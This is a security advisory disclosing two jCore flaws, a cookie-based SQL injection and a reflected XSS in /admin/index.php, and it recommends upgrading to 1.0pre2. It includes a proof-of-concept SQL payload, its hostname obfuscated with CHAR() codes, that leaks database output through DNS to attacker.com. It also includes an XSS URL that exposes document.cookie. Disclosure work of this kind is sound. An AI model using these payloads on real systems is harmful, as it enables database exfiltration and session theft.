Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in jCore, which can be exploited to perform Cross-Site Scripting (XSS) and SQL Injection attacks.


1) SQL Injection in jCore: CVE-2012-4232

1.1 Input passed via the "memberloginid" COOKIE parameter to /admin/index.php is not properly sanitised before being used in SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):


GET /admin/?logout=1 HTTP/1.1
Cookie: memberloginid=' OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 



2) Cross-Site Scripting (XSS) in jCore: CVE-2012-4231

2.1 Input passed via the "path" GET parameter to /admin/index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/?path=%27%20onmouseover%3dalert%28document.cookie%29%20%27

-----------------------------------------------------------------------------------------------

Solution:

As a temporary solution upgrade to version 1.0pre2:
